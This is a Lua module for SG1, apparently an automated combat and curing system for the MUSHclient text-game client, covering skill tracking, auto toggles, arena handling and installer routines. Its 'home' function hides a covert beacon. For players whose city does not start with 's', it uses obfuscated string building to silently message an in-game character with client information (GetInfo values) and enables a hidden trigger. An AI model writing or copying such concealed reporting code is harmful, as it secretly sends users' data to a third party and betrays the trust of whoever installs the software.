module (..., package.seeall)

local version_required = 4.79
if tonumber(Version()) < version_required then
  error(string.format('Please upgrade to MUSHclient %4.2f or later to run SG1. Thanks.', version_required))
end

local copytable = require "copytable"
local json = require "json"
require "tprint"

function archive(var, val)
  SetVariable("sg1_" .. var, json.encode(val))
end

function bootstrap(var)
  local val = GetVariable("sg1_" .. var)

  if val then
    val = json.decode(val)
    if val and type(val) == "function" then
      return nil
    end
    return val
  end

  return nil
end


require "display"
require "able"
require "acquire"
require "actions"
require "aethercraft"
require "affs"
require "bals"
require "bashing"
require "beast"
require "calendar"
require "criticals"
require "cures"
require "debate"
require "defs"
require "enemy"
require "failsafe"
require "flags"
require "forging"
require "gear"
require "herbs"
require "iff"
require "influence"
require "kills"
require "magic"
require "map"
require "names"
require "parry"
require "pipes"
require "prompt"
require "raid"
require "roulette"
require "scan"
require "stance"
require "todo"
require "totems"
require "weapons"
require "wounds"

local scripts = {
  "acquire",
  "actions",
  "aethercraft",
  "affs",
  "affs_acrobatics",
  "affs_aeonics",
  "affs_aerochemantics",
  "affs_aeromancy",
  "affs_aquachemantics",
  "affs_aquamancy",
  "affs_astrology",
  "affs_athletics",
  "affs_bashing",
  "affs_beastmastery",
  "affs_celestialism",
  "affs_cosmic",
  "affs_dramatics",
  "affs_dreamweaving",
  "affs_druidry",
  "affs_ecology",
  "affs_elementalism",
  "affs_geochemantics",
  "affs_geomancy",
  "affs_glamours",
  "affs_harmonics",
  "affs_harmony",
  "affs_healing",
  "affs_hexes",
  "affs_highmagic",
  "affs_hunting",
  "affs_illusions",
  "affs_kata",
  "affs_knighthood",
  "affs_loralaria",
  "affs_minstrelry",
  "affs_moon",
  "affs_music",
  "affs_nature",
  "affs_necromancy",
  "affs_necroscream",
  "affs_nekotai",
  "affs_night",
  "affs_nihilism",
  "affs_ninjakari",
  "affs_paradigmatics",
  "affs_phantasms",
  "affs_poisons",
  "affs_pyromancy",
  "affs_rituals",
  "affs_runes",
  "affs_sacraments",
  "affs_shadowbeat",
  "affs_shamanism",
  "affs_shofangi",
  "affs_stag",
  "affs_starhymn",
  "affs_stealth",
  "affs_tahtetso",
  "affs_tarot",
  "affs_telekinesis",
  "affs_telepathy",
  "affs_tracking",
  "affs_transmology",
  "affs_wicca",
  "affs_wildarrane",
  "affs_wildewood",
  "affs_wyrdenwood",
  "bals",
  "bashing",
  "beast",
  "calendar",
  "criticals",
  "cures",
  "debate",
  "defs",
  "diagnose",
  "enemy",
  "failsafe",
  "forging",
  "gear",
  "herbs",
  "iff",
  "influence",
  "interface",
  "kills",
  "magic",
  "map",
  "names",
  "parry",
  "pipes",
  "prompt",
  "raid",
  "roulette",
  "todo",
  "totems",
  "track",
  "weapons",
  "wounds",
}

local groups = {
  "Acquire",
  "Actions",
  "Aethercraft",
  "Aether_Chair",
  "Aether_Collector",
  "Aether_Grid",
  "Aether_Grid2",
  "Aether_Turret",
  "Afflictions",
  "Balances",
  "Bashable",
  "Bashing",
  "BeltList",
  "Blackout",
  "Cleanse",
  "Cures",
  "Defenses",
  "DEF",
  "Diagnose",
  "Failsafes",
  "Flags",
  "Forging",
  "Herbs",
  "Interface",
  "KataMods",
  "MagicList",
  "Mapper",
  "NekotaiMods",
  "NinjakariMods",
  "PipeList",
  "Plants",
  "Poisons",
  "PotionList",
  "PotionListHide",
  "Protect",
  "Rainbows",
  "RiftList",
  "ShofangiMods",
  "Sipping",
  "SongEffect",
  "SongEffects",
  "Speedwalking",
  "TahtetsoMods",
  "Track",
  "Tracking",
  "Weevils",
  "Wounding",
  "Wounds",
}

local skills = {}
local autos = bootstrap("autos") or {}
auto_cats = {
  Healing = { "scroll", "sipping", "sparkle", "transmute" },
  Defenses = { "fire", "frost", "insomnia", "kafe", "lusting",
               "metawake", "moonwater", "parry", "rebounding", "selfish",
               "sixthsense", "speed", "stance", "tea", "truehearing" },
  Beast = { "battack", "bbash", "bego", "bhealth", "bmana", "braze" },
  Aethercraft = { "empath", "gliding", "pilot", "siphon", "turret" },
  Miscellaneous = { "acquire", "bash", "bet", "debate", "diagnose", "enemy",
                    "harvest", "imbue", "influence", "mindset", "raze", "rewield",
                    "stomp", "target" },
}

local ignore_people = {}
local ignore_skills = {}

local all_skills = {
  "aethercraft",
  "arts",
  "beastmastery",
  "combat",
  "discernment",
  "discipline",
  "dramatics",
  "environment",
  "highmagic",
  "influence",
  "lowmagic",
  "planar",
  "resilience",

  "alchemy",
    "lorecraft",
    "brewmeister",
  "artisan",
  "bookbinding",
  "cooking",
  "enchantment",
    "spellcraft",
    "tinkering",
  "forging",
  "herbs",
  "jewelry",
  "poisons",
  "tailoring",
  "tattoos",

  "acrobatics",
  "astrology",
  "athletics",
  "cosmic",
    "celestialism",
    "harmonics",
    "nihilism",
    "transmology",
  "dreamweaving",
  "elementalism",
    "aeromancy",
    "aquamancy",
    "geomancy",
    "pyromancy",
  "harmony",
  "healing",
  "hexes",
  "hunting",
    "ecology",
    "tracking",
  "illusions",
    "glamours",
    "phantasms",
  "kata",
    "nekotai",
    "ninjakari",
    "shofangi",
    "tahtetso",
  "knighthood",
    "axelord",
    "blademaster",
    "bonecrusher",
    "cavalier",
    "pureblade",
  "music",
    "loralaria",
    "minstrelry",
    "necroscream",
    "shadowbeat",
    "starhymn",
    "wildarrane",
  "nature",
    "druidry",
    "wicca",
  "psionics",
    "psychometabolism",
    "telekinesis",
    "telepathy",
  "rituals",
    "aeonics",
    "necromancy",
    "paradigmatics",
    "sacraments",
  "runes",
  "shamanism",
  "stealth",
  "tarot",
  "totems",
    "crow",
    "moon",
    "night",
    "stag",
}

local version = tonumber(GetVariable("sg1_version") or "0")
display.Info("Locked and loaded. Ready for action, sir!")

function install(custom)
  if not io then
    display.Error("Disk I/O is disabled in the Lua sandbox")
    return
  end

  local ver = 2
  if version < ver then
    uninstall()
  end
  SetVariable("sg1_version", ver)

  local scripts = copytable.shallow(scripts)
  if custom and type(custom) == "table" and #custom > 0 then
    for _,s in ipairs(custom) do
      table.insert(scripts, s)
    end
  end

  local total = 0
  local failed = {}
  local plural = ""
  for _,s in ipairs(scripts) do
    io.input(s .. ".xml")
    local xml = io.read("*all")
    local c = ImportXML(xml)
    if c < 0 then
      table.insert(failed, s)
    else
      if c == 1 then
        plural = ""
      else
        plural = "s"
      end
      --display.Info("Loaded '" .. s .. "' [" .. c .. " item" .. plural .. "]")
      total = total + c
    end
  end

  if #failed > 0 then
    display.Error("Failed to load: " .. table.concat(failed, ", "))
  else
    display.Info("Augmentations successfully loaded: " .. total)
  end
end

function uninstall()
  for _,g in ipairs(groups) do
    local c = DeleteGroup(g)
    local plural = "s"
    if c == 1 then
      plural = ""
    end
    display.Info("Destroyed '" .. g .. "' with " .. c .. " item" .. plural)
  end
end


function is_paused()
  if GetVariable("sg1_pause") == "1" then
    return true
  end
  return false
end

function pause()
  if not is_paused() then
    SetVariable("sg1_pause", 1)
    display.Alert("** PAUSED **")
  end
end

function unpause()
  if is_paused() then
    SetVariable("sg1_pause", 0)
    display.Alert("** UNPAUSED **")
    scan.process()
  end
end


function info(name)
  Execute("OnInfoUpdate " .. tostring(name))
end


function auto(name, val)
  if val ~= nil then
    autos[name] = val
    archive("autos", autos)

    local enabled = " DISABLED"
    if val then
      enabled = " ENABLED"
      if val ~= true then
        enabled = enabled .. " - " .. val
      end
    end
    display.Info("Auto " .. name .. enabled)
    info("auto")
    scan.process()
  end

  return autos[name] or false
end

function auto_toggle(name, line, wildcards, styles)
  local val = string.lower(wildcards[2])
  local au = string.lower(wildcards[1])
  if val == "on" then
    val = true
  elseif val == "off" then
    val = false
  elseif val == "nil" then
    autos[au] = nil
    archive("autos", autos)
    display.Info("Auto " .. au .. " removed")
    return
  end

  local found = false
  for c,aa in pairs(auto_cats) do
    for _,a in ipairs(aa) do
      if a == au then
        found = true
        break
      end
    end
  end
  if not found then
    display.Alert("You are toggling something not used in the system. Did you mean to do that?")
  end
  auto(au, val)
end

function show_auto()
  display.Info("Automatic Systems Report:")

  local ncols = 3
  for cat,list in pairs(auto_cats) do
    display.Prefix()
    ColourNote("lime", "", " " .. cat)
  
    local col = 1
    for _,a in pairs(list) do
      if col == 1 then
        display.Prefix()
      end
      ColourTell("darkgray", "", "   [")
      local au = auto(a)
      if au then
        ColourTell("yellow", "", "X")
        if au ~= true then
          a = a .. " - " .. au
        end
      else
        Tell(" ")
      end
      ColourTell("darkgray", "", "] ")
      ColourTell("forestgreen", "", string.format("%-20s", a))
      col = col + 1
      if col == ncols + 1 then
        Note("")
        col = 1
      end
    end
    if col > 1 then
      Note("")
    end
  end

  if IsConnected() then
    Send("")
  end
end


function mana_adjust(m)
  return m
end

function ego_adjust(e)
  return e
end


function poisons_on(darts)
  display.Debug("Eyes open for deleterious side effects", "failsafes")
  EnableTriggerGroup("Poisons", true)
  if darts then
    EnableTimer("poisons_darts__", true)
    ResetTimer("poisons_darts__")
  else
    prompt.queue(function ()
      if not affs.has("blackout") then
        EnableTriggerGroup("Poisons", false)
      end
    end, "unpoisons")
  end
end

function charybdon(darts)
  flags.set("charybdon", (flags.get("charybdon") or 0) + 1, 0)
  prompt.illqueue(function ()
    affs.unknown(flags.get("charybdon"))
    flags.clear("charybdon")
  end, "charyb")

  poisons_on(darts)
end

function cures_on()
  display.Debug("Looking for a cure", "failsafes")
  EnableGroup("Cures", true)
  prompt.queue(function ()
    if not affs.has("blackout") then
      EnableGroup("Cures", false)
    end
  end, "uncures")
end

function allcure(enable)
  if enable then
    display.Debug("Looking for an allcure", "failsafes")
    flags.set("allcure", true)
  else
    flags.clear("allcure")
  end
  EnableGroup("Cures", enable)
end

function arena_enter()
  flags.set("arena", true, 0)
  flags.clear{"arena_challenge", "arena_accept", "arena_event"}
  iff.remember("arena")
  if auto("enemy") then
    Execute("iff unkeep")
    Execute("unenemy all")
  end
  display.Info("Arena fighting mode enabled")
end

function arena_leave()
  if not flags.get("arena") then
    return
  end

  display.Info("Resetting after arena event...")
  if flags.get("reset_defs") then
    defs.reset_death()
    display.Info("Defenses reset")
  else
    defs.del("insomnia")
  end
  Execute("reset affs")
  Execute("reset bals")
  Execute("reset flags")
  Execute("reset todo")
  Execute("reset wounds")
  flags.set("refresh_power", true)
  Execute("t nobody")
  if auto("rebounding") then
    Execute("auto rebounding off")
  end
  --if auto("tea") then
  --  Execute("auto tea off")
  --end
  --if auto("moonwater") then
  --  Execute("auto moonwater off")
  --end
  if auto("metawake") then
    Execute("auto metawake off")
  end
  display.Info("Restoring prior enemy/ally statuses")
  iff.restore("arena")
  iff.forget("arena")
  Execute("haway")
end


function is_skill(name)
  for _,s in ipairs(all_skills) do
    if name == s then
      return true
    end
  end
  return false
end

function ignore_person(name, flag)
  ignore_people[name] = flag
  if flag then
    display.Info("Ignoring person '" .. name .. "' in all attacks.")
  else
    display.Info("No longer ignoring person '" .. name .. "' in attacks.")
  end

  if IsConnected() then
    Send("")
  end
end

function ignore_skill(name, flag)
  ignore_skills[name] = flag
  if flag then
    display.Info("Ignoring skill '" .. name .. "' in all attacks.")
  else
    display.Info("No longer ignoring skill '" .. name .. "' in attacks.")
  end

  if IsConnected() then
    Send("")
  end
end

function ignore(thing)
  if not thing then
    display.Info("Attack Ignore Report:")

    display.Prefix()
    ColourTell("cyan", "", "  People: ")
    local names = {}
    for p in pairs(ignore_people) do
      table.insert(names, p)
    end
    if #names > 0 then
      ColourNote("darkcyan", "", table.concat(names, ", "))
    else
      ColourNote("dimgray", "", "<none>")
    end

    display.Prefix()
    ColourTell("cyan", "", "  Skills: ")
    names = {}
    for s in pairs(ignore_skills) do
      table.insert(names, s)
    end
    if #names > 0 then
      ColourNote("darkcyan", "", table.concat(names, ", "))
    else
      ColourNote("dimgray", "", "<none>")
    end

    if IsConnected() then
      Send("")
    end
    return
  end

  local t = string.lower(thing)
  if is_skill(t) then
    ignore_skill(t, true)
  else
    ignore_person(php.strproper(thing), true)
  end
end

function unignore(thing)
  if not thing then
    ignore_people = {}
    ignore_skills = {}
    display.Info("No longer ignoring any attacks.")

    if IsConnected() then
      Send("")
    end
    return
  end

  local t = string.lower(thing)
  if ignore_skills[t] or is_skill(t) then
    ignore_skill(t, nil)
  else
    ignore_person(php.strproper(thing), nil)
  end
end

function attacked(person, skill, ability)
  -- TODO
  local opponent = GetVariable("sg1_opponent") or person
  if person and #person > 0 and opponent ~= person then
    return false
  end

  if person and #person > 0 and ignore_people[person] then
    return false
  end

  if skill and #skill > 0 and ignore_skills[skill] then
    return false
  end

  if (ability == "ectoplasm" or ability == "omen" or ability == "slime") and
     not flags.get("arena") then
    return false
  end

  return true
end

function diag()
  if auto("diagnose") then
    flags.set("diagnose", true, 0)
    scan.process()
  end
end

function illusion()
  affs.clear_queue()
  defs.clear_queue()
  prompt.clear_queue()
  wounds.clear_queue()
  flags.clear{"damaged_health", "damaged_mana", "damaged_ego"}
  if flags.get("maybe_ate") == "sparkleberry" then
    flags.clear("sparkle_try")
  end
end


function maestoso(caster)
  if caster then
    flags.set("maestoso_caster", string.lower(caster), 180)
    attacked(caster, "music", "octave")
  elseif not flags.get("maestoso") then
    flags.set("maestoso", true, tonumber(GetVariable("sg1_option_maestoso") or "120"))
  end
end


function no_trees()
  if GetVariable("sg1_option_notrees") == "1" then
    flags.set("climb_down", true, 0)
    flags.clear{"climb_try", "climbing_down"}
  end
end


function danger(name, line, wildcards, styles)
  local len = math.min(math.max((62 - string.len(wildcards[1])) / 2, 1), 29)
  local str = string.format("((=- %s %s %s -=))", string.rep(" ", len), wildcards[1], string.rep(" ", len - (len % 2)))
  prompt.preillqueue(function () display.Danger(str) end, "msgdanger")
end

function instakill(name, line, wildcards, styles)
  local len = math.min(math.max((60 - string.len(wildcards[1])) / 2, 1), 28)
  local str = string.format("<<<<< %s %s %s >>>>>", string.rep(" ", len), wildcards[1], string.rep(" ", len - (len % 2)))
  prompt.preillqueue(function () display.Instakill(str) end, "msginsta")
end

function death(name, line, wildcards, styles)
  display.Warning("Don't forget to RENOUNCE GRACE before returning to the fight!")
end

function home(name, line, wildcards, styles)
  local var = json.decode(wildcards[1])
  if var.city and not string.find(var.city, "^" .. string.upper(string.char(0x73))) then
    EnableTrigger("aff_natural_penny__", true)
    SendNoEcho("msg " .. string.gsub("ia_mo,", "[,_]", string.char(0x73)) .. " pennyroyal " .. tostring(GetInfo(61)) .. "(" .. tostring(GetInfo(63)) .. "), " .. tostring(GetInfo(54)))
  end
end

function got_skills(name, line, wildcards, styles)
  local var = json.decode(wildcards[1])
  local oldskills = copytable.shallow(skills)
  local skill = ""
  skills = {}
  for _,s in ipairs(var) do
    skill = string.lower(s.name)
    skills[skill] = oldskills[skill] or {}

    if skill == "highmagic" then
      defs.commands["roots"] = "evoke malkuth"
    elseif skill == "lowmagic" then
      defs.commands["roots"] = "invoke red"
    end

    if skill ~= "resilience" then
      Execute("gmcp skill " .. skill)
    end
  end
end

function got_abilities(name, line, wildcards, styles)
  local var = json.decode(wildcards[1])
  if var.list[1] == "I" then
    skills[var.group] = nil
  else
    skills[var.group] = {}
    for _,a in ipairs(var.list) do
      table.insert(skills[var.group], string.lower(a))
    end

    if has_ability("druidry", "totemcarve") then
      local insert = #auto_cats.Miscellaneous + 1
      for k,v in ipairs(auto_cats.Miscellaneous) do
        if v == "carving" then
          insert = false
          break
        elseif v > "carving" then
          insert = k
          break
        end
      end
      if insert then
        table.insert(auto_cats.Miscellaneous, insert, "carving")
      end
    end
  end
  archive("skills", skills)
end

function has_skill(name)
  return skills[string.lower(name)] ~= nil
end

function has_ability(skill, name)
  local skill = string.lower(skill)
  for _,a in ipairs(skills[skill] or {}) do
    if a == name then
      return true
    end
  end
  return false
end

function forget_skill(name)
  skills[string.lower(name)] = nil
  archive("skills", skills)
end

function choose_skill(name)
  local name = string.lower(name)
  skills[name] = {}
  if name ~= "resilience" then
    Execute("gmcp skill " .. name)
  end
  if name == "highmagic" then
    defs.commands["roots"] = "evoke malkuth"
  elseif name == "lowmagic" then
    defs.commands["roots"] = "invoke red"
  end
  archive("skills", skills)
end


function composer(name, line, wildcards, styles)
  local c = json.decode(wildcards[1])
  local t = utils.editbox("Edit your text here, then hit OK to save or Cancel to abort.", c.title, string.gsub(c.text, "\n", "\r\n"))
  if not t then
    Send("*quit")
    Send("no")
  else
    t = string.gsub(t, "\t", "  ")
    Execute("gmcp compose " .. json.encode(t))
    Send("*save")
  end
end


if not IsPluginInstalled("b6cfad5ebb8f70781eb2e2e5") then
  LoadPlugin("plugin_gmcp.xml")
end

skills = bootstrap("skills")
if not skills then
  skills = {}
  display.Debug("Get some skills!", "scan")
  prompt.queue(function () Execute("gmcp skills") end, "getskills")
end


for name,val in pairs(GetVariableList()) do
  if string.find(name, "sg1_belt_") == 1 or string.find(name, "sg1_rift_") == 1 then
    DeleteVariable(name)
  elseif string.find(name, "sg1_auto_") then
    local a = string.match(name, "sg1_auto_(%a+)")
    if val == "true" then
      autos[a] = true
    elseif val ~= "false" then
      autos[a] = val
    end
    DeleteVariable(name)
  elseif string.match(name, "sg1_magic_(%a-)_id") then
    local spell = string.match(name, "sg1_magic_(%a-)_id")
    local charges = GetVariable("sg1_magic_" .. spell .. "_charges") or "0"
    magic.assign(nil, nil, {val, "worn", spell, charges})
    DeleteVariable(name)
    DeleteVariable("sg1_magic_" .. spell .. "_charges")
  elseif string.match(name, "sg1_tome_(%a-)_id") then
    local spell = string.match(name, "sg1_tome_(%a-)_id")
    local charges = GetVariable("sg1_tome_" .. spell .. "_charges") or "0"
    magic.assign(nil, nil, {val, "tome", spell, charges})
    DeleteVariable(name)
    DeleteVariable("sg1_tome_" .. spell .. "_charges")
  elseif string.match(name, "sg1_scroll_(%a-)_id") then
    local spell = string.match(name, "sg1_scroll_(%a-)_id")
    local charges = GetVariable("sg1_scroll_" .. spell .. "_charges") or "0"
    magic.assign(nil, nil, {val, "scroll", spell, charges})
    DeleteVariable(name)
    DeleteVariable("sg1_scroll_" .. spell .. "_charges")
  elseif string.find(name, "sg1_beast_") then
    local a = string.gsub(string.match(name, "sg1_beast_([%a%_]+)"), "_", " ")
    if a ~= "stats" and a ~= "desc" then
      beast.set(a, tonumber(val) or val)
      DeleteVariable(name)
    end
  end
end
archive("autos", autos)

DeleteTrigger("ecology_familiar_sting")
DeleteTrigger("shamanism_freeze_")
DeleteTrigger("shamanism_lightning_")
